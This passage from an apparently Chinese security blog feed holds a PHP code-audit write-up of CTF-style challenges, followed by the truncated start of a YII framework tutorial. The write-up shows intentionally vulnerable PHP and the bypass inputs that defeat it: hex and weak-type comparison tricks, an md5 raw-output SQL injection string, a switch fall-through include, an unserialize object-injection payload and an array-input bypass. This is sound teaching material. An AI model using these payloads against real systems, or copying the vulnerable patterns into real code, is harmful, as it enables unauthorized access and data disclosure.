class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="php">    $one = ord(<span class="string">'1'</span>);  <span class="comment">//ord — 返回字符的 ASCII 码值</span></span></span><br><span class="line"><span class="php">    $nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span></span><br><span class="line"><span class="php">    $number = <span class="string">'3735929054'</span>;</span></span><br><span class="line"><span class="php">    <span class="comment">// Check all the input characters!</span></span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// Disallow all the digits!</span></span></span><br><span class="line"><span class="php">        $digit = ord($temp&#123;$i&#125;);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="comment">// Aha, digit not allowed!</span></span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="string">"flase"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($number == $temp)</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$temp = $_GET[<span class="string">'password'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> noother_says_correct($temp);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里，它不让输入1到9的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，0x开头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de，在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag</p><p>echo  dechex ( 3735929054 ); // 将3735929054转为16进制<br>结果为：deadc0de<br>构造： <a href="http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0d" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0d</a></p><h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag&#123;test&#125;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$temp = $_GET[<span class="string">'password'</span>];</span></span><br><span class="line"><span class="php">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;    </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>利用PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。如果输入一个1337a这样的字符串，在is_numeric中返回true，然后在比较时被转换成数字1337，这样就绕过判断输出flag。</p><p><a href="http://127.0.0.1/php_bug/22.php?password=1337a" target="_blank" rel="noopener">http://127.0.0.1/php_bug/22.php?password=1337a</a></p><h2 id="md5函数true绕过注入"><a href="#md5函数true绕过注入" class="headerlink" title="md5函数true绕过注入"></a>md5函数true绕过注入</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$link</span> = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$link</span>) &#123;</span><br><span class="line">  die(<span class="string">'Could not connect to MySQL: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> 选择数据库</span><br><span class="line"><span class="variable">$db</span> = mysql_select_db(<span class="string">"security"</span>, <span class="variable">$link</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">'select db error'</span>;</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> 执行sql</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM users WHERE password = '"</span>.md5(<span class="variable">$password</span>,true).<span class="string">"'"</span>;</span><br><span class="line">var_dump(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>) or die(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"><span class="variable">$row1</span> = mysql_fetch_row(<span class="variable">$result</span>);</span><br><span class="line">var_dump(<span class="variable">$row1</span>);</span><br><span class="line">mysql_close(<span class="variable">$link</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当md5后的hex转换成字符串后，如果包含 ‘or’<trash> 这样的字符串，那整个sql变成<br>SELECT * FROM admin WHERE pass = ‘’or’6<trash>‘<br>提供一个字符串：ffifdyop</trash></trash></p><p>md5后，276f722736c95d99e921722cf9ed621c</p><p>再转成字符串： ‘or’6<trash></trash></p><h2 id="switch没有break-字符与0比较绕过"><a href="#switch没有break-字符与0比较绕过" class="headerlink" title="switch没有break 字符与0比较绕过"></a>switch没有break 字符与0比较绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'which'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $which = $_GET[<span class="string">'which'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">switch</span> ($which)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">0</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">1</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">2</span>:</span></span><br><span class="line"><span class="php">        <span class="keyword">require_once</span> $which.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">         <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">default</span>:</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'PHP-0817'</span>, <span class="string">'Hacker NoNoNo!'</span>, <span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>让我们包含当前目录中的flag.php，给which为flag，这里会发现在case 0和case 1的时候，没有break，按照常规思维，应该是0比较不成功，进入比较1，然后比较2，再然后进入default，但是事实却不是这样，事实上，在 case 0的时候，字符串和0比较是相等的，进入了case 0的方法体，但是却没有break，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们which传入flag的时候，case 0比较进入了方法体，但是没有break，默认已经匹配成功，往下执行不再判断，进入2的时候，执行了require_once flag.php</p><p>PHP中非数字开头字符串和数字 0比较==都返回True</p><p>因为通过逻辑运算符让字符串和数字比较时，会自动将字符串转换为数字.而当字符串无法转换为数字时，其结果就为0了，然后再和另一个0比大小，结果自然为ture。注意：如果那个字符串是以数字开头的，如6ldb，它还是可以转为数字6的，然后和0比较就不等了（但是和6比较就相等） if($str==0) 判断 和 if( intval($str) == 0 ) 是等价的<br>可以验证：<br>&lt;?php<br>$str=”s6s”;<br>if($str==0){ echo “返回了true.”;}<br>?&gt;<br>要字符串与数字判断不转类型方法有：</p><p>方法一： $str=”字符串”;if($str===0){ echo “返回了true.”;}</p><p>方法二： $str=”字符串”;if($str==”0”){ echo “返回了true.”;} ,</p><p>此题构造：<a href="http://127.0.0.1/php_bug/25.php?which=aa" target="_blank" rel="noopener">http://127.0.0.1/php_bug/25.php?which=aa</a></p><p>资料：</p><h2 id="unserialize-序列化"><a href="#unserialize-序列化" class="headerlink" title="unserialize()序列化"></a>unserialize()序列化</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 题目：http://web.jarvisoj.com:32768 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- index.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span></span><br><span class="line"><span class="php">$x = <span class="keyword">new</span> Shield();</span></span><br><span class="line"><span class="php"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span></span><br><span class="line"><span class="php">$x = unserialize($g);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $x-&gt;readfile();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- shield.php --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- showimg.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$f = $_GET[<span class="string">'img'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span></span><br><span class="line"><span class="php">$f = base64_decode($f);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span></span><br><span class="line"><span class="php"><span class="comment">//stripos — 查找字符串首次出现的位置（不区分大小写）</span></span></span><br><span class="line"><span class="php">&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">readfile($f);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">说明flag在pctf.php，但showimg.php中不允许直接读取pctf.php，只有在index.php中可以传入变量<span class="keyword">class</span> ，index.php中Shield类的实例<span class="variable">$X</span> = unserialize(<span class="variable">$g</span>)，<span class="variable">$g</span> = <span class="variable">$_GET</span>['<span class="keyword">class</span>'];，<span class="variable">$X</span>中不知<span class="variable">$filename</span>变量，但需要找的是：<span class="variable">$filename</span> = <span class="string">"pctf.php"</span>，现<span class="variable">$X</span>已知，求传入的<span class="keyword">class</span>变量值。 可以进行序列化操作：</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- answer.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span></span><br><span class="line"><span class="php">$x = <span class="class"><span class="keyword">class</span> <span class="title">Shield</span>();</span></span></span><br><span class="line"><span class="php">$g = serialize($x);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $g;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- shield.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>得到： O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;} 构造： <a href="http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</a></p><h2 id="利用提交数组绕过逻辑"><a href="#利用提交数组绕过逻辑" class="headerlink" title="利用提交数组绕过逻辑"></a>利用提交数组绕过逻辑</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$role = <span class="string">"guest"</span>;</span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag&#123;test_flag&#125;"</span>;</span></span><br><span class="line"><span class="php">$auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>]))&#123;</span></span><br><span class="line"><span class="php">    $role = unserialize(base64_decode($_COOKIE[<span class="string">"role"</span>]));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($role === <span class="string">"admin"</span>)&#123;</span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $role = base64_encode(serialize($role));</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">'role'</span>,$role);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($auth)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $filename = $_POST[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">        $data = $_POST[<span class="string">'data'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(preg_match(<span class="string">'[&lt;&gt;?]'</span>, $data)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'No No No!'</span>.$data);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            $s = implode($data);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!preg_match(<span class="string">'[&lt;&gt;?]'</span>, $s))&#123;</span></span><br><span class="line"><span class="php">                $flag=<span class="string">'None.'</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $rand = rand(<span class="number">1</span>,<span class="number">10000000</span>);</span></span><br><span class="line"><span class="php">            $tmp=<span class="string">"./uploads/"</span>.md5(time() + $rand).$filename;</span></span><br><span class="line"><span class="php">            file_put_contents($tmp, $flag);</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"your file is in "</span> . $tmp;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Hello admin, now you can upload something you are easy to forget."</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;there are the source.&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;textarea rows="10" cols="100"&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> htmlspecialchars(str_replace($flag,<span class="string">'flag&#123;???&#125;'</span>,file_get_contents(<span class="keyword">__FILE__</span>)));</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;/textarea&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry. You have no permissions."</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这段代码首先会查看提交的请求中是否存在 &lt;&gt; 如果没有则将传入的数据(如果是数组)转化为字符串。如果其中存在 &lt;&gt; 则将flag生成在一个随机命名的文件中。 implode() 这个函数需要传入数组，如果传入的是字符串将报错，变量 $s 自然也就没有值。<br>想要通过Post请求的形式传入数组可以使用 data[0]=123&amp;data[1]=&lt;&gt; 的形式传入数组，这样的话在执行 implode() 函数的时候就不会使 &amp;s 为空，成功绕过这段逻辑拿到flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>YII基础学习笔记</title>
      <link href="/2019/03/01/YII%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/03/01/YII%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><p>实现在HelloController.php中编写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'hello word'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a> 访问成功</p><p>获取get和post 请求内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $request = \YII::$app-&gt;request;<span class="comment">//全局类</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $request-&gt;get(<span class="string">'id'</span>,<span class="number">20</span>); <span 